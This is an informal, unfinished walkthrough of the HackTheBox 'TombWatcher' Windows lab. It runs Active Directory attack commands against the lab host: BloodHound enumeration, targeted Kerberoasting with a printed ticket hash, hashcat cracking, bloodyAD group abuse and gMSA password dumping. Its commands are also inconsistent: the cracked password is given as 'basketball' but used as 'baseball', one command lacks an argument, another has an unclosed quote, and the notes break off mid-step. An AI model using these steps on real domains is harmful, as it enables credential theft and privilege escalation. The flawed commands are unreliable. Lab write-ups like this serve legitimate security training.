# TombWatcher (Windows HackTheBox)

## IP
```10.10.11.72```

## Pre Req
- As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: ```henry``` / ```H3nry_987TGV!```


## recon
- ```nmap -v -sCTV -p- -T4 -Pn -oN tombwatcher.nmap 10.10.11.72```
- was looking for ```Ip Adress DC01.tombwatcher.htb tombwatcher.htb```

## enumerate 
- ```nxc bloodhound -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb --no-pass-pol```
- could have used sharphound and stuff
- there is normally a zip file generated like for example ```/home/lily/.nxc/logs/DC01_$IP_2025-06-07_062123_bloodhound.zip``` i did not find mine yet but googled around and stuff
- Came back the next day and was able to pull this
```
bloodhound-ce-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.10.11.72 -c all
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 05S
```

## Kerberoasting attack
- ```python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'```
- this took a long time with my time sync 
- but eventually I got 
```
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$49d9c547ad031953a05f6a25e66a8b80$8ef73ed989e747287080924518a0e8050fa398356eb1b09c87e2e86a92fc0ba5a569a346b92eb0afcc84bdd424a6556ca1b78b31d0e074ccea1229dd171ee5e2de733ae3352aa4a3bc5766509d6262056a606bd31cc08917edb7c4fb82740e714947d2d9ed43d165f063de986a28feef36ce8a31ea5424c75f2273477d6035c33bb334c33c969792ad9ccba578d9edae0f4d44fafc94d8c806c42e2a7fb2ad7111ba4618ba4a81a53d0c20aa2039bb45ab6056d1278c7381d8b244dd46ed75ee81e641a8a1856e96258b7d445a8de81139bf95cbaa5e6eda5d36c69bab2221a33429fd36f01afd066e94f2983cade71fb95b2f7bffacf21b4b933495138a67409e19ac78b626eddf7b0fa2ec053bc65685f46cad89c76d878b807798597c2dafc51346bd4607f0ab71ff810b7d681dd34410c9a71f340acd0728954f42bee0fec3ed61168da687a794c1ffe0e5c2bfb8469e0fa3414e31ac094439a20010a84ad294e950cc46b4739e2870b60ba7a07f2ef5f9ae645dd16e2166f53f4a7d004f29a81f937bf9963e570ede9a35004dca5e6f0b7ed6a05881ef2e66420b11e5094715d544b069be1ecc883f0236c95b3178470ba81913d9464ad6627d60ab224f995ba9c5b10e4c0e971dbb6e1be6048cc53d4c343661c751a8e5c83843bad6897c23cc41d3c23fa650df84fd58fc37c2a5ba583d8f086e4a6596d80d3f874f6194d8d6ac330161b85f7343c5e1fe1777c902ae2fc9a80e1eb6ae00719664edd180736ac89f52f5237fb7eed26b55b136931e66cf4bdeefb8e80589a8e5a4ea31438425fbb109360133af8543c15261cc0395bf6a0f2a466cf023f9c5f249138aaebf771314176b06f705e03ae4184cdfdea38dcae381580184240bbf22b6281b939d7f53fb7f73132c47c548ddb83130d837b161baf38ab11b003a6316a9b82c7672f24aef53ec20ab66c69de8716050538cbaa7ede6b76e6a7f113d2c4c8ba6664e39870e2ec9cdba368c27b0fa6bc848a86d95b47c1114a32bf33383e2a926efdb10ec098605d10d6724a667971a77d115eb07632958a603b54a7b557874175b2c6fc2c614058697351267be6801038a621398a84b104300211c476290ce79170553abfcd4ffc3c23dd0c2c1c1a6f6bdcf39a77fb1b3d9648c38394bfef49208603cff22252c6882416dc5580d7522109e25c3efc6f3afed85b7a6e7e4a17c90c66bc5c2541d35e28d150d1ce220eeffdfc5873cb1d409604351b1bbda883486ba2f25c6f84e93744387cf0dbd3ef8041694f0facc69d0338b82acc82f1c0968c92aa9fd67fd6fca909cbc3d29d905183378874344915649d16306efa0798d5647728e480739be607b2869e1b0722bb6bac9eca68ea496df64a3a293cc67e0a1040037bf7641a619e00cb3eb25afad8849fa5107d86fafd4c968231ff974d6cb9b12e678bd83f614766ebdd5fb7a92897c1d8a81
```
- time to hashcat ```hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt```
- now i have user: ```alfred``` pass: ```basketball```

## Modify AD Group Membership
- alfred has rights to add users to the "Infrastructure" group
- ```bloodyAD -u 'alfred' -p 'baseball' -d tombwatcher.htb --dc-ip $IP add groupMember INFRASTRUCTURE ```    

## Abuse Infrastructure Group Permissions
- Members of Infrastructure group can read GMSA passwords
- ```python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb ```
- 